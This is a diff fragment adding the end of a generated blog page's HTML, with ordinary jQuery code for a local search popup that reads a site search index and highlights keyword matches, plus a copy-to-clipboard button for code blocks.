+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').not('.gist .highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+        if (result) $(this).text('复制成功');
+        else $(this).text('复制失败');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+</body>
+</html>
